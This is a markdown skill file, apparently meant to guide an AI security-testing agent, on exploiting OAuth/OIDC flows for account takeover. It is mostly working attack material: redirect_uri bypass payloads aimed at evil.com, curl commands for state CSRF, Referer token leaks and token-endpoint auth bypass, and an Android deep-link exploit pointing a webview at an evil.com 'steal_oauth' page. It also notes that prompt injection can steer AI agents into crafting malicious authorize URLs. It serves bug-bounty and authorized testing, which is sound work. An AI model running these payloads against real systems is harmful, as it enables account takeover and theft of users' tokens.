---
name: OAuth 2.0 / OIDC Security Testing
description: Exploit OAuth/OIDC flows (redirect_uri, state, nonce, PKCE, response_type, token claims) to achieve account takeover, session theft, and auth bypass.
tags: [oauth, oidc, account-takeover, auth-bypass, redirect-uri, sso]
recommended_tools: [http_request, http_repeater, http_intruder, katana_crawl, hakrawler_crawl, curl, jwt_analyzer, python3]
vuln_classes: [auth_bypass]
domain: web
phase: exploitation
provenance: {source: uphiago/recon-skills, paths: [redteam/hunt-oauth/SKILL.md]}
---

# OAuth 2.0 / OIDC Security Testing

OAuth/OIDC flaws are among the highest-impact web bugs because they directly enable **account takeover (ATO), session theft, and authentication bypass**. The primary attacker goals are: (1) land the authorization `code` or `access_token` on an attacker-controlled host, (2) bind a victim session to an attacker identity via CSRF, or (3) skip a mandatory auth step (email verification, MFA) at the token endpoint.

CWE references: CWE-601 (Open Redirect), CWE-352 (CSRF / missing `state`), CWE-287 (Improper Authentication), CWE-346 (Origin Validation Error), CWE-290 (Auth Bypass by Spoofing).

## Attack surface enumeration

High-value endpoints and assets:
- Authorization endpoints: `/oauth/authorize`, `/connect/authorize`
- Token exchange: `/oauth/token`
- Callback handlers: `/auth/callback`, `/oauth/callback`, `/login/oauth/callback`
- Redirect params on generic flows: `/login?redirect_uri=`, `/signin?next=`, `/auth?return_to=`
- Mobile deep-link / webview handlers: custom-scheme URIs, `push_notification_webview`

Recon steps:
1. Crawl for OAuth paths with `katana_crawl` / `hakrawler_crawl`; grep JS bundles for `client_id`, `redirect_uri`, `response_type`, `state`, `nonce`, `access_token`, `client_secret`, `intent://`, `deeplink`.
2. Pull the OIDC metadata:
   ```bash
   curl -s https://target.com/.well-known/openid-configuration | jq .
   curl -s https://target.com/.well-known/oauth-authorization-server | jq .
   ```
   Note `authorization_endpoint`, `token_endpoint`, `response_types_supported`, `response_modes_supported` (look for `web_message`, `fragment`), and whether PKCE is advertised.
3. Fingerprint the stack: Doorkeeper/OmniAuth/Devise (Ruby), Passport.js (Node), Spring Security OAuth, `expo-auth-session`. Social login buttons (Google/Facebook/Apple) guarantee an OAuth surface.
4. For mobile: `apktool d app.apk`, grep `AndroidManifest.xml` for `intent-filter` handling `http(s)://` or custom schemes; grep resources for embedded `client_secret`.

Response signals that confirm OAuth: `Location:` header pointing at an authorize endpoint, `Set-Cookie: oauth_state=`, `WWW-Authenticate: Bearer`, or `access_token` in a JSON body.

## Methodology (ordered)

1. **Map the full flow.** Capture the authorization request (`client_id`, `redirect_uri`, `state`, `nonce`, `response_type`, `code_challenge`) and the callback (where the `code`/token lands, what validates `state`/`nonce`).
2. **Attack `redirect_uri` validation (highest yield).** See payload ladder below. This is the single most productive OAuth bug class.
3. **Attack `state` (CSRF).** Remove `state` entirely — does the flow complete? Reuse a fixed value across sessions. Confirm it is bound to the session server-side, not merely present.
4. **Attack `nonce` (replay).** Capture a `nonce` from one flow and replay it in another; check it is verified against the ID token *after* the code exchange, not just echoed.
5. **Attack step ordering.** For multi-step auth (signup → email verify → grant), try hitting `/oauth/token` directly with unverified credentials. If the token endpoint issues a fully-scoped token without checking prerequisite completion → auth bypass.
6. **Hunt referrer/leak sinks on the callback page.** With `code`/token in the query or fragment, check every outbound request (images, analytics, language switchers, social share, `postMessage`) for the full URL leaking via `Referer` or cross-origin read.
7. **Test `response_type` / `response_mode` downgrade.** Force `response_type=token` on an endpoint that only validated `code`; force `response_mode=web_message` to have the code returned to a parent window via `postMessage`.
8. **Test mobile deep links.** Craft malicious intent/custom-scheme URIs that steer an OAuth webview to an attacker host; check host validation on the loaded URL.
9. **Test leaked/embedded credentials.** If `client_secret` is in a JS bundle or APK, replay token requests with arbitrary `redirect_uri`.
10. **Gate 0 validate** (below) before reporting.

## redirect_uri bypass payload ladder

```
# Host confusion (userinfo delimiter)
https://legit.com@evil.com/cb
https://legit.com.evil.com/cb          # subdomain extension
https://evil.com#legit.com             # fragment injection

# Path traversal (server validates raw string, browser/downstream normalizes)
https://legit.com/oauth/callback/../../redirect?url=https://evil.com

# Open-redirect chain (find an open redirect ON the whitelisted domain first)
https://legit.com/logout?next=https://evil.com

# Parameter pollution (which one does the server read vs. use?)
?redirect_uri=https://legit.com/cb&redirect_uri=https://evil.com/cb

# Encoded-slash / encoded-@ to confuse the parser
https://legit.com%2F@evil.com
https://legit.com%252F..%252F..evil.com
```

### Browser-parse vs server-parse — why a server bypass is not always an exploit

A server-side prefix/substring flaw on `redirect_uri` is **necessary but not sufficient**. The server check passing is one gate; the browser actually navigating cross-origin is another. The WHATWG URL parser (all modern browsers since 2018) parses userinfo (`@`) ONLY in the authority section — **before the first `/` after `://`**. After the path begins, `@` is just a character.

| Server validator | Attack URL | Server check | Browser host | Exploit? |
|---|---|---|---|---|
| prefix `https://acme.example` (no slash) | `https://acme.example@evil.com/cb` | passes | evil.com | **YES** |
| prefix `https://acme.example/` (trailing slash) | `https://acme.example/@evil.com/cb` | passes | acme.example | **NO** |
| substring `https://acme.example` | `https://acme.example.evil.com/cb` | passes | acme.example.evil.com | **YES** |
| prefix `https://acme.example/` + `..` normalize | `https://acme.example/../../@evil.com/cb` | passes raw | acme.example | usually **NO** |
| Chromium `\`→`/` | `https://acme.example/\@evil.com/cb` | passes | acme.example (becomes `//@`) | usually **NO** |

**Operational rule:** always headless-test the *final navigation* (Playwright/Puppeteer/real browser) before writing an OAuth finding as an ATO chain. Server-side accept + browser stays on the legitimate host = **not** ATO.

## Concrete tests

### state CSRF (account-linking ATO)
```bash
# 1. Initiate the flow from the attacker account, capture the code before exchange.
curl -sv "https://target.com/oauth/authorize?client_id=APP&redirect_uri=https://target.com/cb&response_type=code&state=FIXED_VALUE"
# 2. Force the victim (already logged into target.com) to visit the callback with the attacker's code.
#    https://target.com/oauth/callback?code=ATTACKER_CODE&state=FIXED_VALUE
# If state is absent or not session-bound, the victim's account links to the attacker's IdP identity → attacker logs in as victim.
```

### Nonce / token leak via Referer
```bash
curl -sv "https://target.com/auth/callback?code=ABC&state=XYZ" \
  -H "Referer: https://evil.com" --max-redirs 0
# Then enumerate outbound requests on the callback page that carry the full URL:
grep -rE "fetch|XMLHttpRequest|img\.src|script\.src" callback_page.html
```

### Token endpoint auth bypass (skip email verification)
```bash
curl -X POST https://target.com/oauth/token \
  -d "grant_type=authorization_code" -d "code=CAPTURED_CODE" \
  -d "client_id=CLIENT_ID" -d "redirect_uri=https://legit.com/callback"

# Or exchange unverified credentials directly:
curl -X POST https://target.com/oauth/token \
  -d "grant_type=password" -d "username=unverified@evil.com" \
  -d "password=password123" -d "client_id=CLIENT_ID"
```

### Mobile deep-link exploit (Android)
```bash
adb shell am start -a android.intent.action.VIEW \
  -d "target-app://push_notification_webview?url=https://evil.com/steal_oauth"
```
```html
<a href="intent://push_notification_webview?url=https://evil.com#Intent;scheme=target-app;package=com.target.app;end">Click</a>
```

## Bypass techniques (defender → attacker)

- **Exact-match redirect_uri whitelist** → find an open redirect on the whitelisted host itself and use it as the `redirect_uri`; the OAuth server validates the domain, the open redirect bounces the code to the attacker.
- **`state` required** → check it validates *format/length* but not *session binding*. Use a fixed predictable value. If PKCE is not also enforced, `state` alone does not stop code injection.
- **Fragment-only delivery (`response_type=token`)** → the fragment is not sent in `Referer`, but callback JS often reads `window.location.hash` and forwards it to analytics or `postMessage`. Intercept the `postMessage` handlers.
- **Host validation on mobile deep links** → URL-encode (`https%3A//evil.com`), double-encode, Unicode-normalize, or null-byte to pass the validator while the webview still navigates.
- **Short-lived codes** → referrer leaks and open redirects still work with a fast receiver; for CSRF the victim completes the flow, so code lifetime is irrelevant.
- **PKCE enforcement** → check it is required for *all* clients. Omit `code_challenge`; if tokens still issue, PKCE is not enforced. Legacy/mobile clients are often exempt.
- **Nonce validation** → check it is JS-only, or validated on the initial request but not on refresh. If the ID-token signature is not verified, tamper the `nonce` claim.

## Common root causes

- Prefix/`startsWith`/`endsWith` `redirect_uri` matching instead of strict exact-match, or whole-domain whitelisting instead of specific paths.
- Missing / client-side-only `state` (no CSRF protection).
- `nonce` echoed but never verified against the ID token post-exchange.
- Auth step ordering not enforced server-side; token endpoint issues tokens without a verification-status check.
- Tokens/codes placed in URL on a callback page that fires outbound (analytics/CDN/share) requests leaking `Referer`.
- Mobile webview wrappers that trust any input URL.
- Wildcard / unrestricted redirect URI registration left over from development.
- `client_secret` embedded in mobile/JS (confidential client treated as public).

## Gate 0 validation (before reporting)

1. **What can the attacker DO right now?** State the full chain: "send crafted URL → victim clicks → their `code` lands on my server → I exchange it for an access token → I am logged in as the victim." If you cannot complete this, it may be informational.
2. **What does the victim LOSE?** Minimum bar: authenticated session/account access. `state`-only leakage with no credential is Low; **code/token leakage with a successful exchange demonstrated is Critical** — the exchange step is non-negotiable.
3. **Reproducible in 10 minutes from a fresh browser/device with no prior state?** If it needs lucky timing or victim behavior beyond "click a link," document those dependencies.

## Chaining notes

- **Dangling subdomain** — redirect_uri validator accepts any `*.target.com` + a `dev-staging.target.com` CNAME to a deprovisioned Heroku/S3/Azure app → claim the subdomain, host a callback receiver, and the whitelist "legitimately" passes.
- **SAML → OAuth** — an XSW attack on the SAML assertion alters `NameID` to admin; the SP then issues an OAuth token bearing admin identity.
- **AI agents** — agentic flows (MCP servers, ChatGPT plugins) reuse OAuth 2.1 + PKCE; indirect prompt-injection can make an agent craft an authorize URL with an attacker `redirect_uri` that the user approves.

## Disclosed reports & real-world CVEs

- **Semrush — IDN-homograph redirect_uri bypass** ([H1 #861940](https://hackerone.com/reports/861940)): `redirect_uri=https://oauth.šemrush.com/cb` (punycode `xn--emrush-9jb.com`) passed an ASCII string-equality host check that did not normalize Unicode confusables to punycode before compare (2020).
- **pixiv — path-traversal redirect_uri** ([H1 #1861974](https://hackerone.com/reports/1861974)): `redirect_uri=https://legit.pixiv.host/legit/../../attacker/cb` — validator inspected the raw string, downstream normalized `../` and emitted the code to the attacker path. $2,000, 2023.
- **Slack — domain-suffix redirect_uri bypass** ([H1 #2575](https://hackerone.com/reports/2575)): `endsWith()`/suffix match instead of exact host equality; `slack.com.attacker.com` passed. Foundational case (2013).
- **Bohemia Interactive — redirect_uri filter bypass** ([H1 #405100](https://hackerone.com/reports/405100)): weak regex/prefix filter accepted an attacker-controlled host while still matching the pattern, chained to full token leak.
- **Booking.com (Facebook social login)** ([Salt Labs](https://salt.security/blog/traveling-with-oauth-account-takeover-on-booking-com)): three-step chain — open redirect on the whitelisted `account.booking.com` + redirect_uri path trust + `response_type` swap → Facebook code/token theft → ATO (March 2023).
- **Expo.io `expo-auth-session` — CVE-2023-28131** ([Salt Labs](https://salt.security/blog/a-new-oauth-vulnerability-that-may-impact-hundreds-of-online-services)): OAuth proxy did not validate the `returnUrl` host before forwarding the social-IdP callback; `returnUrl=https://attacker.tld` leaks Facebook/Google/Apple/Twitter codes. CVSS 9.6, fixed Feb 2023.
- **Microsoft Azure AD "nOAuth"** ([Descope](https://www.descope.com/blog/post/noauth)): the Azure AD `email`/`mail` claim is mutable and unverified; an attacker sets their admin profile `mail` to the victim's address, then "Log in with Microsoft" on a relying party that keys users by email → instant cross-IdP ATO. Fixed June 2023 (`xms_edov` claim added).
- **Grammarly / Vidio / Bukalapak "Pass-The-Token"** ([Salt Labs](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts)): relying party calls Facebook `/me` with an attacker-issued token but never validates the token's `app_id`/`aud` belongs to the RP; attacker replays a token issued for `attacker.app` → server finds victim's email → issues victim session. ~1B accounts, Oct 2023.
- **Zoom — "dirty dancing" chained ATO** ([Harel](https://nokline.github.io/bugbounty/2024/06/07/Zoom-ATO.html)): `response_mode=web_message` returns the code to a parent window via `postMessage`; the listener accepted any `*.zoom.us` origin + missing `state` CSRF binding → code interception → ATO + cam/mic hijack. $15,000, fixed Jan 2024.
- **Detectify "Dirty Dancing" multi-vendor token leakage** ([Detectify Labs](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/)): `response_type` downgrade/swap on an endpoint that only validated `code`, combined with promiscuous `postMessage` receivers and URL-storage gadgets on the callback page, siphons tokens with **no XSS required**. PortSwigger Top 10 Web Hacks 2022 #1.

## Reference impact scenarios

- **Mobile session theft (PayPal/Venmo pattern):** an Android push-notification webview handler accepts an arbitrary `url` deep-link parameter without host validation; a crafted custom-scheme URL sent to a victim opens a webview on the attacker host, which initiates an OAuth flow and captures the token as it returns to the attacker-controlled "callback" → full ATO on a payments platform.
- **Email-verification bypass (GitLab pattern):** `/oauth/token` validates credentials but performs no verification-status check; an unverified account calls it directly and receives a fully-scoped token that passes all downstream authorization → complete auth bypass undermining the email-verification control.
- **Referer token theft (Rockstar pattern):** the Facebook-login callback page carries `access_token` in the query string; a language-switcher GET leaks the full URL via `Referer`, harvesting Facebook OAuth tokens from logs → cross-platform ATO.
